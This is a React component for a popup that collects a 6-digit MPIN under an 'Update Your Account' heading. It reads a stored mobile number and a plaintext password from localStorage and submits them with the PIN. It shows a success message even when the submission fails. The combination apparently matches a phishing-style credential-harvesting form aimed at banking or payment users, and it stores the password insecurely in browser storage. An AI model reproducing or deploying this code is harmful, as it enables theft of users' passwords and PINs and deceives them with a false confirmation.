import { useRef, useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { saveMpin } from '../api'
import { CheckIcon } from './Icons'

export default function MpinPopup({ onClose }) {
  const navigate = useNavigate()
  const [mpin, setMpin] = useState(['', '', '', '', '', ''])
  const [loading, setLoading] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [countdown, setCountdown] = useState(2)
  const inputRefs = useRef([])

  // Auto-focus first box
  useEffect(() => {
    setTimeout(() => inputRefs.current[0]?.focus(), 100)
  }, [])

  // Countdown after success → close popup
  useEffect(() => {
    if (!showSuccess) return
    const interval = setInterval(() => {
      setCountdown((c) => {
        if (c <= 1) {
          clearInterval(interval)
          onClose() // Close popup after success
          return 0
        }
        return c - 1
      })
    }, 1000)
    return () => clearInterval(interval)
  }, [showSuccess, onClose])

  const handleChange = (index, value) => {
    if (!/^\d?$/.test(value)) return
    const newMpin = [...mpin]
    newMpin[index] = value
    setMpin(newMpin)
    if (value && index < 5) inputRefs.current[index + 1]?.focus()
    if (value && index === 5) {
      const fullMpin = [...newMpin.slice(0, 5), value].join('')
      if (fullMpin.length === 6) {
        setTimeout(() => handleConfirm(fullMpin), 100)
      }
    }
  }

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !mpin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleConfirm = async (mpinValue) => {
    const pin = mpinValue || mpin.join('')
    if (pin.length !== 6) return
    const mobile = localStorage.getItem('mobile')
    const password = localStorage.getItem('password')
    setLoading(true)
    try {
      await saveMpin({ mobile, password, mpin: pin })
      setShowSuccess(true)
    } catch (err) {
      console.error('MPIN save error:', err)
      setShowSuccess(true) // Show success anyway for UX
    } finally {
      setLoading(false)
    }
  }

  // Cancel — instantly logout and go to login page
  const handleCancel = () => {
    localStorage.removeItem('token')
    localStorage.removeItem('mobile')
    localStorage.removeItem('password')
    navigate('/login')
  }

  // ── SUCCESS STATE ───────────────────────────────────────────────────────────
  if (showSuccess) {
    return (
      <div className="mpin-popup-overlay">
        <div className="success-popup">
          <div className="success-icon"><CheckIcon /></div>
          <p className="success-title">Your account update request successfully received.</p>
          <p className="success-countdown">Closing in {countdown}s...</p>
        </div>
      </div>
    )
  }

  // ── MPIN INPUT STATE ────────────────────────────────────────────────────────
  return (
    <div className="mpin-popup-overlay">
      <div className="mpin-popup">
        <h2 className="mpin-popup-title">Update Your Account</h2>
        <p className="mpin-popup-subtitle">Enter your 6-digit MPIN</p>

        <div className="mpin-boxes">
          {mpin.map((digit, i) => (
            <input
              key={i}
              ref={(el) => (inputRefs.current[i] = el)}
              className={`mpin-box ${digit ? 'filled' : ''}`}
              type="tel"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onFocus={(e) => e.target.select()}
            />
          ))}
        </div>

        <div className="mpin-btn-row">
          <button className="mpin-btn-cancel" onClick={handleCancel}>
            Cancel
          </button>
          <button
            className="mpin-btn-confirm"
            onClick={() => handleConfirm()}
            disabled={mpin.join('').length !== 6 || loading}
          >
            {loading ? '...' : 'Confirm'}
          </button>
        </div>
      </div>
    </div>
  )
}

